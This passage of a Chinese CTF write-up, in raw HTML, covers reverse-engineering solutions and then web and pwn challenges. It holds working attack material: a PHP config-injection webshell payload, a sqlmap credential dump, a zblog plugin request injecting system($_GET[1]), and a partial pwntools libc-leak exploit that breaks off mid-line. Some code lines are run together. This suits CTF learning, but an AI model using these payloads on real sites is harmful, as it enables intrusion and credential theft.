class="number">4</span>]==<span class="built_in">ord</span>(f[<span class="number">4</span>]))</span><br><span class="line">s.add(P[<span class="number">0</span>]==<span class="number">12</span>*a[<span class="number">5</span>]+<span class="number">44</span>*a[<span class="number">7</span>]+<span class="number">17</span>*a[<span class="number">6</span>]+<span class="number">100</span>*a[<span class="number">8</span>]+<span class="number">20</span>*a[<span class="number">9</span>]+<span class="number">75</span>*a[<span class="number">10</span>])</span><br><span class="line">s.add(P[<span class="number">1</span>]==<span class="number">63</span>*a[<span class="number">10</span>]+<span class="number">58</span>*a[<span class="number">9</span>]+<span class="number">46</span>*a[<span class="number">5</span>]+<span class="number">25</span>*a[<span class="number">8</span>]-<span class="number">89</span>*a[<span class="number">7</span>]+<span class="number">12</span>*a[<span class="number">6</span>]+<span class="number">2</span>)</span><br><span class="line">s.add(P[<span class="number">2</span>]==<span class="number">23</span>*a[<span class="number">8</span>]+<span class="number">45</span>*a[<span class="number">9</span>]+<span class="number">26</span>*a[<span class="number">5</span>]+<span class="number">77</span>*a[<span class="number">6</span>]+<span class="number">11</span>*a[<span class="number">10</span>]+<span class="number">41</span>*a[<span class="number">7</span>]+<span class="number">6</span>)</span><br><span class="line">s.add(P[<span class="number">3</span>]==<span class="number">34</span>*a[<span class="number">7</span>]+<span class="number">12</span>*a[<span class="number">8</span>]+<span class="number">15</span>*a[<span class="number">10</span>]+<span class="number">19</span>*a[<span class="number">9</span>]+<span class="number">20</span>*a[<span class="number">6</span>]+<span class="number">44</span>*a[<span class="number">5</span>]+<span class="number">12</span>)</span><br><span class="line">s.add(P[<span class="number">4</span>]==<span class="number">4</span>*a[<span class="number">9</span>]+<span class="number">2</span>*a[<span class="number">10</span>]+<span class="number">5</span>*a[<span class="number">7</span>]-<span class="number">4</span>*a[<span class="number">8</span>]+<span class="number">8</span>*a[<span class="number">6</span>]+a[<span class="number">5</span>]+<span class="number">20</span>)</span><br><span class="line">s.add(P[<span class="number">5</span>]==<span class="number">12</span>*a[<span class="number">6</span>]+<span class="number">10</span>*a[<span class="number">7</span>]+<span class="number">9</span>*a[<span class="number">9</span>]+<span class="number">8</span>*a[<span class="number">8</span>]+<span class="number">99</span>*a[<span class="number">10</span>]+<span class="number">85</span>*a[<span class="number">5</span>]+<span class="number">11</span>)</span><br><span class="line">s.add(P[<span class="number">6</span>]==<span class="number">11</span>*a[<span class="number">11</span>]+<span class="number">12</span>*a[<span class="number">12</span>]+<span class="number">33</span>*a[<span class="number">13</span>]+<span class="number">55</span>*a[<span class="number">14</span>]+<span class="number">77</span>*a[<span class="number">15</span>]+<span class="number">20</span>*a[<span class="number">16</span>]+<span class="number">24</span>)</span><br><span class="line">s.add(P[<span class="number">7</span>]==<span class="number">66</span>*a[<span class="number">11</span>]+<span class="number">45</span>*a[<span class="number">13</span>]+<span class="number">78</span>*a[<span class="number">15</span>]+<span class="number">21</span>*a[<span class="number">14</span>]+<span class="number">56</span>*a[<span class="number">12</span>]+<span class="number">3</span>*a[<span class="number">16</span>]+<span class="number">110</span>)</span><br><span class="line">s.add(P[<span class="number">8</span>]==<span class="number">65</span>*a[<span class="number">12</span>]+<span class="number">25</span>*a[<span class="number">15</span>]+<span class="number">78</span>*a[<span class="number">16</span>]+<span class="number">54</span>*a[<span class="number">14</span>]+<span class="number">96</span>*a[<span class="number">11</span>]+a[<span class="number">13</span>]*<span class="number">13</span>+<span class="number">5</span>)</span><br><span class="line">s.add(P[<span class="number">9</span>]==<span class="number">88</span>*a[<span class="number">13</span>]+<span class="number">20</span>*a[<span class="number">14</span>]+a[<span class="number">15</span>]*<span class="number">7</span>+a[<span class="number">16</span>]*<span class="number">36</span>+a[<span class="number">11</span>]*<span class="number">11</span>+a[<span class="number">12</span>]*<span class="number">41</span>+<span class="number">10</span>)</span><br><span class="line">s.add(P[<span class="number">10</span>]==a[<span class="number">14</span>]*<span class="number">14</span>+a[<span class="number">15</span>]*<span class="number">55</span>+a[<span class="number">16</span>]*<span class="number">62</span>+a[<span class="number">11</span>]*<span class="number">17</span>+a[<span class="number">12</span>]*<span class="number">8</span>+a[<span class="number">13</span>]+<span class="number">410</span>)</span><br><span class="line">s.add(P[<span class="number">11</span>]==a[<span class="number">15</span>]*<span class="number">52</span>+a[<span class="number">16</span>]+a[<span class="number">11</span>]+a[<span class="number">12</span>]*<span class="number">2</span>+a[<span class="number">14</span>]*<span class="number">5</span>+a[<span class="number">13</span>]*<span class="number">6</span>+a[<span class="number">14</span>]*<span class="number">88</span>+<span class="number">50</span>)</span><br><span class="line">s.add(P[<span class="number">12</span>]==a[<span class="number">17</span>]+a[<span class="number">18</span>]+<span class="number">8</span>*a[<span class="number">19</span>]+<span class="number">9</span>*a[<span class="number">20</span>]+<span class="number">11</span>*a[<span class="number">21</span>]+<span class="number">85</span>*a[<span class="number">22</span>]+<span class="number">11</span>)</span><br><span class="line">s.add(P[<span class="number">13</span>]==a[<span class="number">18</span>]*<span class="number">56</span>+a[<span class="number">19</span>]*<span class="number">65</span>+a[<span class="number">20</span>]*<span class="number">78</span>+a[<span class="number">21</span>]*<span class="number">22</span>+a[<span class="number">22</span>]*<span class="number">55</span>+a[<span class="number">17</span>]+<span class="number">26</span>)</span><br><span class="line">s.add(P[<span class="number">14</span>]==a[<span class="number">19</span>]*<span class="number">19</span>+a[<span class="number">20</span>]*<span class="number">3</span>-a[<span class="number">21</span>]-a[<span class="number">22</span>]+a[<span class="number">17</span>]*<span class="number">6</span>+a[<span class="number">18</span>]*<span class="number">20</span>-<span class="number">11</span>)</span><br><span class="line">s.add(P[<span class="number">15</span>]==a[<span class="number">20</span>]*<span class="number">8</span>+a[<span class="number">21</span>]*<span class="number">77</span>+a[<span class="number">22</span>]*<span class="number">46</span>+a[<span class="number">17</span>]*<span class="number">4</span>-a[<span class="number">18</span>]*<span class="number">10</span>-a[<span class="number">19</span>]*<span class="number">5</span>-<span class="number">30</span>)</span><br><span class="line">s.add(P[<span class="number">16</span>]==a[<span class="number">21</span>]*<span class="number">21</span>+a[<span class="number">22</span>]*<span class="number">22</span>+a[<span class="number">17</span>]*<span class="number">17</span>+a[<span class="number">18</span>]*<span class="number">18</span>+a[<span class="number">19</span>]*<span class="number">19</span>+a[<span class="number">20</span>]*<span class="number">20</span>+<span class="number">120</span>)</span><br><span class="line">s.add(P[<span class="number">17</span>]==a[<span class="number">22</span>]*<span class="number">9</span>+a[<span class="number">21</span>]*<span class="number">85</span>+a[<span class="number">20</span>]*<span class="number">5</span>+a[<span class="number">19</span>]*<span class="number">9</span>+a[<span class="number">18</span>]*<span class="number">8</span>+a[<span class="number">17</span>]*<span class="number">4</span>-<span class="number">600</span>)</span><br><span class="line">s.add(P[<span class="number">18</span>]==a[<span class="number">23</span>]*<span class="number">5</span>+a[<span class="number">24</span>]*<span class="number">6</span>+a[<span class="number">25</span>]*<span class="number">7</span>+a[<span class="number">26</span>]*<span class="number">8</span>+a[<span class="number">27</span>]*<span class="number">88</span>+a[<span class="number">28</span>]*<span class="number">22</span>-<span class="number">200</span>)</span><br><span class="line">s.add(P[<span class="number">19</span>]==a[<span class="number">24</span>]*<span class="number">50</span>+a[<span class="number">25</span>]*<span class="number">80</span>+a[<span class="number">26</span>]*<span class="number">10</span>+a[<span class="number">27</span>]*<span class="number">7</span>+a[<span class="number">28</span>]*<span class="number">12</span>-a[<span class="number">23</span>]*<span class="number">20</span>-<span class="number">640</span>)</span><br><span class="line">s.add(P[<span class="number">20</span>]==a[<span class="number">25</span>]*<span class="number">14</span>+a[<span class="number">26</span>]*<span class="number">8</span>+a[<span class="number">27</span>]*<span class="number">4</span>+a[<span class="number">28</span>]*<span class="number">25</span>+a[<span class="number">23</span>]*<span class="number">3</span>+a[<span class="number">24</span>]*<span class="number">7</span>-<span class="number">720</span>)</span><br><span class="line">s.add(P[<span class="number">21</span>]==a[<span class="number">26</span>]*<span class="number">8</span>+a[<span class="number">27</span>]*<span class="number">80</span>+a[<span class="number">28</span>]*<span class="number">40</span>+a[<span class="number">23</span>]*<span class="number">6</span>+a[<span class="number">24</span>]*<span class="number">5</span>+a[<span class="number">25</span>]*<span class="number">60</span>-<span class="number">500</span>)</span><br><span class="line">s.add(P[<span class="number">22</span>]==a[<span class="number">27</span>]*<span class="number">10</span>+a[<span class="number">28</span>]*<span class="number">85</span>+a[<span class="number">23</span>]*<span class="number">40</span>+a[<span class="number">24</span>]*<span class="number">41</span>+a[<span class="number">25</span>]*<span class="number">25</span>-a[<span class="number">26</span>]*<span class="number">26</span>-<span class="number">260</span>)</span><br><span class="line">s.add(P[<span class="number">23</span>]==a[<span class="number">28</span>]*<span class="number">9</span>+a[<span class="number">23</span>]*<span class="number">9</span>+a[<span class="number">24</span>]*<span class="number">55</span>-a[<span class="number">25</span>]*<span class="number">10</span>-a[<span class="number">26</span>]-a[<span class="number">27</span>])</span><br><span class="line">s.add(P[<span class="number">24</span>]==a[<span class="number">29</span>]+a[<span class="number">30</span>]+a[<span class="number">20</span>]-a[<span class="number">19</span>]-a[<span class="number">18</span>]*<span class="number">2</span>+a[<span class="number">16</span>]-<span class="number">250</span>)</span><br><span class="line">s.add(P[<span class="number">25</span>]==a[<span class="number">30</span>]-a[<span class="number">29</span>]+<span class="number">3</span>*a[<span class="number">16</span>]+<span class="number">4</span>*a[<span class="number">5</span>]+<span class="number">55</span>*a[<span class="number">27</span>]+a[<span class="number">25</span>]-<span class="number">400</span>)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">answer=s.model()</span><br><span class="line"><span class="built_in">print</span>(answer)</span><br><span class="line"><span class="comment">#flag&#123;L1sten_t0_the_s1lence_Of_extinct10n!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="bmzre"><a href="#bmzre" class="headerlink" title="bmzre"></a>bmzre</h3><p>去花指令</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/922ffc457041bfddcf7809b8d1301470.png" alt="img"></p><p>这里是因为ida对call函数的分析出了错误，这里的花指令将call函数当jmp使用，没有retn，只有一个add esp 4来维持堆栈平衡，直接上脚本去花</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>(<span class="params">addr,endaddr</span>):</span></span><br><span class="line"><span class="keyword">while</span>(addr&lt;endaddr): </span><br><span class="line">PatchByte(addr,<span class="number">0x90</span>) </span><br><span class="line">addr+=1<span class="keyword">def</span> </span><br><span class="line">undefine(addr,endaddr):  </span><br><span class="line"><span class="keyword">while</span> addr&lt;endaddr: </span><br><span class="line">MakeUnkn(addr,<span class="number">0</span>) </span><br><span class="line">addr+=1<span class="keyword">def</span> </span><br><span class="line">dejunkcode(addr,endaddr):  </span><br><span class="line"><span class="keyword">while</span> addr&lt;endaddr: </span><br><span class="line">MakeCode(addr)  <span class="comment"># 匹配模版  </span></span><br><span class="line"><span class="keyword">if</span> Byte(addr)==<span class="number">0xe8</span> <span class="keyword">and</span> Byte(addr+<span class="number">6</span>)==<span class="number">0x12</span> <span class="keyword">and</span> Byte(addr+<span class="number">7</span>)==<span class="number">0x83</span>:  </span><br><span class="line"><span class="built_in">next</span>=addr+<span class="number">10</span> nop(addr,<span class="built_in">next</span>) addr=<span class="built_in">next</span> <span class="keyword">continue</span> addr+=ItemSize(addr)dejunkcode(<span class="number">0x00401000</span>,<span class="number">0x00411E40</span>)</span><br></pre></td></tr></table></figure><p>flag的长度为32位</p><p>将flag分成两段，分别通过两个函数去检查</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/43f1bef9a450aad88948debca3cf69a2.png" alt="img"></p><p>第一个检查函数,考察负数的表示方法和使用</p><p>对输入的字符进行-109操作，这里考察了char类型</p><p>一个字节的范围是 0x00-0xff</p><p>char类型强制类型转化的话可以看作有符号整数</p><p>这里所比较的字符串为负数 所以写脚本的时候需要+0x100</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m=[<span class="number">0xc8</span>,<span class="number">0xf4</span>,<span class="number">0xf5</span>,<span class="number">0xc7</span>,<span class="number">0xc5</span>,<span class="number">0xc3</span>,<span class="number">0xf9</span>,<span class="number">0xc6</span>,<span class="number">0xf7</span>,<span class="number">0xcb</span>,<span class="number">0xc8</span>,<span class="number">0xc7</span>,<span class="number">0xca</span>,<span class="number">0xf8</span>,<span class="number">0xc3</span>,<span class="number">0xc4</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m: </span><br><span class="line">flag+=<span class="built_in">chr</span>(i+<span class="number">109</span>-<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/2d35a497923e5921c632c73962d89ca9.png" alt="img"></p><p>第二个检查函数考察了古典密码的替换类型，简单的替换</p><p>key是2103</p><p>没四个字符为一组，以key=2103的方式进行替换</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/34cb11990addaec148f2afa074be62bd.png" alt="img"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flagbmz</span>&#123;<span class="number">5</span>ab<span class="number">420</span>f<span class="number">3</span>d<span class="number">8547</span>e<span class="number">01</span>a<span class="number">1846</span>a<span class="number">15</span>db<span class="number">0209</span>e<span class="number">6</span>&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>1给了源码！审计一下：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">if</span>(isset($_GET[<span class="string">&#x27;re&#x27;</span>]))&#123; <span class="selector-tag">file_put_contents</span>(<span class="string">&quot;./config.php&quot;</span>,base64_decode(<span class="string">&quot;PD9waHAKJExBTkdbJ21lbWJlcl9tYW5hZ2UnXSA9ICdhZG1pbic7Cj8+Cg==&quot;</span>));&#125;</span><br></pre></td></tr></table></figure><p>发现re可以给config赋值！ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$LANG</span>[<span class="string">&#x27;member_manage&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;?</span><br></pre></td></tr></table></figure><p>这有什么用呢！</p><p>我们本地测试一下：</p><p>第一次：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Sudo</span>=<span class="number">1</span>info[name]=<span class="number">1</span>&amp;no<span class="number">1</span>=<span class="number">1</span>’</span><br></pre></td></tr></table></figure><p>写入config里的内容是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$LANG</span>[<span class="string">&#x27;1&#x27;</span>] = ‘<span class="number">1</span>’’;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二次请求：</p><p>发送与第一次相同的 POST 请求</p><p><code>require $file;</code> 引入语言文件得到 <code>$LANG[$key]</code> 的值是 <code>string(2) &quot;1&#39;&quot;</code>，也就是说，没有反斜杠，这样问题就出现了，我们同样的请求发送了两次，按照代码逻辑来看，是不应该更新 $LANG[$key] 的值的</p><p>但是因为 require 和 file_get_contents 函数读取之后的文件内容不含反斜杠，而我们 POST 传入的 language 会被转义处理得到的值是 <code>string(3) &quot;1&#39;&quot;</code></p><p>于是判断 <code>$LANG[$key]!=$_POST[&#39;language&#39;]</code> 就成立了，接着 str_replace 函数进行字符串替换操作，把原来的 <code>$LANG[&#39;1&#39;] = &#39;1&#39;&#39;;</code> 中的 1’ 替换成 1’，最终写入文件</p><p>最后文件内容变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$LANG</span>[<span class="string">&#x27;1&#x27;</span>] = ‘<span class="number">1</span>’’;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知道上面的知识点：就可以写shell了！</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">Sudo =1&amp;info[name]=member_manage&amp;no1=&#x27;?&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">111111</span>;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[upload]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h3><p>1.抓包，发现fastjson格式。</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/85c801350b2db0c58ab725eb1083a170.png" alt="img"></p><p>2.探测fastjson版本为:1.2.68</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/f2206b3cdb470c233c9d59fc0c5dee54.png" alt="img"></p><p>3.使用fast_json_rce辅助进行rce或者getshell</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/ed53183dd2932b646d48ac5d17c41a3a.png" alt="img"></p><p>zbl og-scshop </p><p>扫描目录发现web.zip，robots.txt存在zblog目录</p><p>scshop前台存在sql注入，这里利用订阅处的一个sql</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/2bcb4f8a60e59df6d42400d4ec203a6d.png" alt="img"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /Core/Program/Ant_Rponse.php?actions=SubNewsletter&amp;lgid=<span class="number">1</span> HTTP/<span class="number">1</span>.<span class="number">1</span>Host: ctf.bmzclub.cn:<span class="number">9932</span>User-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">99</span>.<span class="number">0</span>.<span class="number">7113</span>.<span class="number">93</span> Safari/<span class="number">537</span>.<span class="number">36</span>Accept: */*Accept-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span>Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-<span class="number">8</span>X-Requested-With: XMLHttpRequestContent-Length: <span class="number">49</span>Origin: http://ctf.bmzclub.cn:<span class="number">9932</span>Connection: closeReferer: http://ctf.bmzclub.cn:<span class="number">9932</span>/e_ml=aaaa%<span class="number">40</span>qq.com&amp;e_couid=<span class="number">1</span>*&amp;e_coucode=SEMCMS</span><br><span class="line"><span class="attribute">python3</span> .sqlmap.py -r .<span class="number">1</span>.txt --technique B -D zblogphp -T zbp_member -C  mem_Name,mem_password --dump</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/2e341a68aab5ba4b5f8635eb2893db91.png" alt="img"></p><p>得到zblog管理员账号WHTadmin</p><p>访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf.bmzclub.cn:<span class="number">9932</span><span class="regexp">/zblog/</span>zb_system/login.php</span><br></pre></td></tr></table></figure><p>WHTadmin/admin888登陆zblog后台</p><p>审计可以发现在新建插件的地方，app_name的参数未进行严格过滤，导致可以写入恶意代码进行代码执行</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/80fcec9a393e2d66bc34cb9dda799ee4.png" alt="img"></p><p>构造</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /zblog_scshop/zblog/zb_users/plugin/AppCentre/plugin_edit.php HTTP/<span class="number">1</span>.<span class="number">1</span>Host: <span class="number">127.0.0.1</span>User-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">99</span>.<span class="number">0</span>.<span class="number">7113</span>.<span class="number">93</span> Safari/<span class="number">537</span>.<span class="number">36</span>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span>Accept-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span>Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: <span class="number">503</span>Origin: http://<span class="number">127.0.0.1</span>Connection: closeReferer: http://<span class="number">127.0.0.1</span>/zblog_scshop/zblog/zb_users/plugin/AppCentre/plugin_edit.phpCookie: timezone=<span class="number">8</span>; username_b<span class="number">120</span>b<span class="number">784</span>=WHTadmin; token_b<span class="number">120</span>b<span class="number">784</span>=<span class="number">222</span>e<span class="number">898</span>db<span class="number">7</span>b<span class="number">62</span>a<span class="number">172</span>da<span class="number">21</span>c<span class="number">151</span>c<span class="number">98</span>e<span class="number">702</span>d<span class="number">5</span>b<span class="number">4</span>b<span class="number">05</span>bd<span class="number">05</span>f<span class="number">10</span>f<span class="number">83</span>af<span class="number">06474</span>e<span class="number">3</span>f<span class="number">46</span>fed<span class="number">1641208909</span>; addinfozblog_scshopzblog=%<span class="number">7</span>B%<span class="number">22</span>chkadmin%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">2</span>C%<span class="number">22</span>chkarticle%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">2</span>C%<span class="number">22</span>levelname%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">5</span>Cu<span class="number">7</span>ba<span class="number">1</span>%<span class="number">5</span>Cu<span class="number">7406</span>%<span class="number">5</span>Cu<span class="number">5458</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">22</span>userid%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">221</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">22</span>useralias%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>WHTadmin%<span class="number">22</span>%<span class="number">7</span>D; http<span class="number">304</span>ok=<span class="number">1</span>; PHPSESSID=t<span class="number">5</span>oq<span class="number">8</span>rrpgtle<span class="number">43</span>pr<span class="number">0</span>fi<span class="number">2</span>q<span class="number">92</span>kma; timezone=<span class="number">8</span>Upgrade-Insecure-Requests: <span class="number">1</span>Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?<span class="number">1</span>token=cb<span class="number">9</span>f<span class="number">630545</span>b<span class="number">265</span>fca<span class="number">60</span>f<span class="number">25</span>c<span class="number">85362905</span>b&amp;app_id=aaaaaa&amp;app_name=&#x27;;phpinfo();system($_GET[<span class="number">1</span>]);//&amp;app_url=&amp;app_note=&amp;app_adapted=<span class="number">172960</span>&amp;app_version<span class="number">1</span>=<span class="number">1</span>&amp;app_version<span class="number">2</span>=<span class="number">0</span>&amp;app_version<span class="number">3</span>=&amp;app_pubdate=<span class="number">2021</span>-<span class="number">12</span>-<span class="number">31</span>&amp;app_modified=<span class="number">2021</span>-<span class="number">12</span>-<span class="number">31</span>&amp;app_author_name=WHTadmin&amp;app_author_email=null%<span class="number">40</span>null.com&amp;app_author_url=&amp;app_path=main.php&amp;app_include=include.php&amp;app_level=<span class="number">1</span>&amp;app_phpver=<span class="number">5</span>.<span class="number">2</span>&amp;app_price=<span class="number">0</span>&amp;app_advanced_dependency=&amp;app_advanced_conflict=&amp;app_advanced_rewritefunctions=&amp;app_advanced_existsfunctions=&amp;app_description=</span><br></pre></td></tr></table></figure><p>去插件中心启用</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/7304d9bbdd94aea3a600332ed35ca993.png" alt="img"></p><p>访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/zblog/</span>zb_users<span class="regexp">/plugin/</span>aaaaaa/main.php</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/8f3a462d448617b0339aa1be4629637f.png" alt="img"></p><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, offset, data, quiet=<span class="literal">False</span></span>):</span> </span><br><span class="line"><span class="keyword">if</span> quiet: p.sendline(<span class="string">&quot;1&quot;</span>) </span><br><span class="line">p.sendline(<span class="built_in">str</span>(size)) </span><br><span class="line">p.sendline(<span class="built_in">str</span>(offset)) </span><br><span class="line">p.sendline(data)  </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>) </span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(size)) </span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(offset)) </span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>, data)<span class="comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span></span><br><span class="line">p=process(<span class="string">&quot;./goodfile&quot;</span>)elf=ELF(<span class="string">&#x27;./goodfile&#x27;</span>)</span><br><span class="line">libc=elf.libc<span class="comment"># make chunk adjacent to libc</span></span><br><span class="line">base = <span class="number">0x200000</span></span><br><span class="line">space = (base + <span class="number">0x1000</span>) * <span class="number">1</span> - 0x10new(base, space + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x10</span> + <span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">space = (base + <span class="number">0x1000</span>) * <span class="number">2</span> - 0x10new(base, space + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x20</span> + <span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>, quiet=<span class="literal">True</span>)</span><br><span class="line">libc_base = u64(p.recvline()[<span class="number">0x08</span>:<span class="number">0x10</span>]) - 0x3ed8b0success(<span class="string">&quot;libc = &quot;</span> + <span class="built_in">hex</span>(libc_base))<span class="comment"># get the shell!</span></span><br><span class="line">space = (base + <span class="number">0x1000</span>) * <span class="number">3</span> - 0x10new(base, space + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">0x38</span> + <span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0xfbad208b</span>)payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0xd8</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]) * 6payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x2000</span>)</span><br><span class="line">payload += <span class="string">b&#x27;&#x27;</span> * (<span class="number">8</span>*<span class="number">7</span> + <span class="number">4</span>) <span class="comment"># padding</span></span><br><span class="line">new_size = libc_base + libc.search(<span class="string">&#x27;/bin/shx00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload += p64(<span class="number">0xfbad1800</span>)payload += p64(<span class="number">0</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">payload += p64(<span 